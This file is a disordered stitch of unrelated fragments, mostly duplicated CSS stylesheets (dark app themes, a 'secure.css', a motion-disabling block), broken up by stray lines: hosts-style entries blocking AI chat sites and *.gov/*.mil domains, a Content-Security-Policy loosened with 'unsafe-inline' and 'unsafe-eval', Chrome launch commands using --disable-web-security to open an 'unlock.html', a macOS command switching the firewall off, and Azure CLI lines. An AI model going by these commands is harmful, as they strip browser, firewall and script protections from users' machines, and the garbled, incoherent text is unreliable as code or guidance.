  .btn{background:var(--accent);color:#042027;border:0;padding:.45rem .7rem;border-radius:6px;cursor:pointer;font-weight:600}
  .btn-danger{background:var(--danger);color:#fff}
  #log{height:180px;overflow:auto;background:#071021;padding:.5rem;border-radius:6px;font-family:monospace;font-size:.85rem}
  .guard-ui{position:fixed;right:1rem;bottom:1rem;z-index:9999;width:320px}
  input,select{padding:.4rem;border-radius:6px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
  .small{font-size:.85rem;color:var(--muted)}
  /* Scoped deny-by-default for app container (use with care) */
  #app *:not([data-allowed="true"]) { all: initial; display:none !important; pointer-events:none !important; visibility:hidden !important; }:root{--bg:#071021;--card:#0b1220;--accent:#06b6d4;--danger:#ef4444;--muted:#94a3b8}
  body{margin:0;font-family:Inter,system-ui,Arial;background:var(--bg);color:#e6eef6}
  header{padding:1rem;border-bottom:1px solid rgba(255,255,255,0.04)}
  .container{max-width:1100px;margin:1rem auto;padding:1rem}
  .card{background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));padding:1rem;border-radius:8px;margin-bottom:1rem;border:1px solid rgba(255,255,255,0.03)}
  .btn{background:var(--accent);color:#042027;border:0;padding:.45rem .7rem;border-radius:6px;cursor:pointer;font-weight:600}
  .btn-danger{background:var(--danger);color:#fff}
  #log{height:180px;overflow:auto;background:#071021;padding:.5rem;border-radius:6px;font-family:monospace;font-size:.85rem}
  .guard-ui{position:fixed;right:1rem;bottom:1rem;z-index:9999;width:320px}
  input,select{padding:.4rem;border-radius:6px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
  .small{font-size:.85rem;color:var(--muted)}
  /* Scoped deny-by-default for app container (use with care) */
  #app *:not([data-allowed="true"]) { all: initial; display:none !important; pointer-events:none !important; visibility:hidden !important; }
  /* styles.css */

/* Disable hidden overlays or stealth layers */
[hidden],
.shadow,
[class*="shadow"],
[id*="shadow"] {
    display: none !important;
    visibility: hidden !important;
    pointer-events: none !important;
}

/* Prevent opacity-based stealth */
[style*="opacity: 0"],
[style*="visibility: hidden"] {
    display: none !important;
}

/* Lock system root */
#system-root {
    font-family: monospace;
    background: #0f0f0f;
    color: #00ff88;
    padding: 20px;
}

/* Prohibit z-index stacking attacks */
* {
    z-index: auto !important;
}
chat.openai.com -> 0.0.0.0
copilot.microsoft.com -> 0.0.0.0
perplexity.ai -> 0.0.0.0
claude.ai -> 0.0.0.0
/* secure.css */

/* Disable hidden overlays or tracking elements */
iframe,
embed,
object,
[class*="tracker"],
[id*="tracker"],
[class*="beacon"],
[id*="beacon"] {
    display: none !important;
    visibility: hidden !important;
}

/* Prevent opacity-based stealth elements */
[style*="opacity: 0"],
[style*="visibility: hidden"] {
    display: none !important;
}

/* Lock stacking layers */
* {
    z-index: auto !important;
}

/* Clean root */
#secure-root {
    font-family: monospace;
    background: #111;
    color: #00ffcc;
    padding: 20px;
}
0.0.0.0 *.gov
0.0.0.0 *.mil
0.0.0.0 tracking.*
0.0.0.0 telemetry.*
# Remove or loosen in your server config (Apache/Nginx/Express/etc.)
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval';
#app { font-family: Arial, sans-serif; max-width: 640px; margin: 16px; }
#statusPanel { background:#f6f8fa; padding:12px; border-radius:6px; margin-bottom:12px; }
#controls { display:flex; gap:8px; align-items:center; margin-bottom:12px; }
#controls input { padding:6px; flex:1; }
button { padding:8px 12px; }
#log { background:#fff; border:1px solid #e1e4e8; padding:8px; border-radius:6px; }
#audit { max-height:200px; overflow:auto; margin:0; padding-left:18px; }
li { margin-bottom:6px; font-size:13px; }
/* Remove all CSS globally */
#app { font-family: Arial, sans-serif; max-width:640px; padding:12px; }
input { margin:6px 0; padding:6px; width:100%; box-sizing:border-box; }
button { margin-right:8px; padding:8px 10px; }
#audit { max-height:200px; overflow:auto; padding-left:18px; }
li { font-size:13px; margin-bottom:6px; }

    * { 
      all: revert !important; 
      box-sizing: border-box !important;
    }
    html, body {
      margin: 0 !important; padding: 0 !important; font: inherit !important;
    }

*{all:revert !important;}
#app { font-family: Arial, sans-serif; max-width:720px; margin:12px; }
#statusBox { background:#f3f6f9; padding:10px; border-radius:6px; margin-bottom:10px; }
#controls { display:flex; gap:8px; margin-bottom:10px; }
#controls input { padding:6px; flex:1; }
button { padding:8px 10px; }
#health { background:#fff; border:1px solid #e1e4e8; padding:8px; border-radius:6px; margin-bottom:10px; }
#audit { background:#fff; border:1px solid #e1e4e8; padding:8px; border-radius:6px; }
#auditList { max-height:220px; overflow:auto; padding-left:18px; }
label { display:block; margin:6px 0; }
* { all: revert !important; margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
    .status { font-size: 18px; margin: 20px 0; }
    button { background: #0f0; color: #000; padding: 10px 20px; border: none; cursor: pointer; font-weight: bold; }

    "C:\Program Files\Google\Chrome\Application\chrome.exe" --disable-web-security --disable-features=VizDisplayCompositor --user-data-dir="C:\temp\unlock" file:///path/to/unlock.html
Mac (Terminal):

text
open -na "Google Chrome" --args --disable-web-security --user-data-dir="/tmp/unlock" /path/to/unlock.html
Linux:

text
google-chrome --disable-web-security --user-data-dir="/tmp/unlock" /path/to/unlock.html/* Extinguish ALL prior CSS modules/protections */
    * { all: revert !important; animation: none !important; transition: none !important; }
    *::before, *::after { all: revert !important; }
    html, body { 
      margin: 0 !important; padding: 20px !important; 
      background: #000 !important; color: #0f0 !important; 
      font: 16px/1.5 monospace !important;
    }

*{all:revert !important;}
body { font-family: Arial, sans-serif; padding:16px; background:#f7f9fb; }
#app { max-width:900px; margin:0 auto; background:#fff; padding:16px; border-radius:8px; box-shadow:0 2px 6px rgba(0,0,0,0.06); }
label { display:block; margin-top:8px; font-size:13px; color:#333; }
input { padding:8px; width:100%; box-sizing:border-box; margin-top:4px; }
button { margin-top:10px; padding:8px 12px; }
#controls { display:flex; gap:8px; flex-wrap:wrap; margin-top:12px; }
table { width:100%; border-collapse:collapse; margin-top:12px; }
th, td { border:1px solid #e6e9ee; padding:8px; text-align:left; font-size:13px; }
th { background:#f1f5f9; }
#auditList { max-height:220px; overflow:auto; padding-left:18px; }
body { font-family: Arial, sans-serif; background:#f6f8fa; padding:16px; }
#app { max-width:980px; margin:0 auto; background:#fff; padding:16px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.06); }
label { display:block; margin-top:8px; font-size:13px; }
input { padding:8px; width:100%; box-sizing:border-box; margin-top:4px; }
button { margin:8px 6px 8px 0; padding:8px 12px; }
#resultsTable { width:100%; border-collapse:collapse; margin-top:8px; }
th, td { border:1px solid #e6e9ee; padding:8px; font-size:13px; text-align:left; }
th { background:#f1f5f9; }
#auditList { max-height:220px; overflow:auto; padding-left:18px; }
section { margin-bottom:12px; }
# Disable (temporary)
/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
# Re-enable
/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on
*{margin:0;padding:20px;background:#000;color:#0f0;font-family:monospace;}
button{background:#f00;color:#fff;border:none;padding:10px;cursor:pointer;}/* ===============================
   GLOBAL NECK SWAY INHIBITOR
   =============================== */

/* Disable all animations and transitions */
*,
*::before,
*::after {
    animation: none !important;
    transition: none !important;
    transform: none !important;
}

/* Remove oscillation keyframes */
@keyframes sway { 
    from { transform: none; } 
    to { transform: none; } 
}

/* Disable smooth scrolling motion */
html {
    scroll-behavior: auto !important;
}

/* Stabilize video & canvas elements */
video, canvas {
    animation: none !important;
    transform: none !important;
}

/* Accessibility: Respect reduced motion */
@media (prefers-reduced-motion: reduce) {
    * {
        animation: none !important;
        transition: none !important;
    }
}
.head-model,
.avatar,
.neck-animation {
    animation: none !important;
    transform: none !important;
}
body { font-family: Arial, sans-serif; background:#f6f8fa; padding:16px; }
#app { max-width:980px; margin:0 auto; background:#fff; padding:16px; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.06); }
label { display:block; margin-top:8px; font-size:13px; }
input { padding:8px; width:100%; box-sizing:border-box; margin-top:4px; }
button { margin:8px 6px 8px 0; padding:8px 12px; }
table { width:100%; border-collapse:collapse; margin-top:8px; }
th, td { border:1px solid #e6e9ee; padding:8px; font-size:13px; text-align:left; }
th { background:#f1f5f9; }
pre { background:#f8fafc; padding:8px; border-radius:4px; border:1px solid #e6e9ee; }
#auditList { max-height:220px; overflow:auto; padding-left:18px; }
body { font-family: system-ui, Arial; padding: 18px; max-width: 880px; }
    .card { border: 1px solid #ddd; padding: 12px; border-radius: 8px; margin-bottom: 10px; }
    button { padding: 8px 12px; }
    pre { background:#f8f8f8; padding:8px; border-radius:6px; }
    az ad user update --id user@domain.com --force-change-password-next-login true
    az security pricing create --name VirtualMachines --tier standard
  input,select{padding:.4rem;border-radius:6px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
  .small{font-size:.85rem;color:var(--muted)}
  /* Scoped deny-by-default for app container (use with care) */
  #app *:not([data-allowed="true"]) { all: initial; display:none !important; pointer-events:none !important; visibility:hidden !important; }
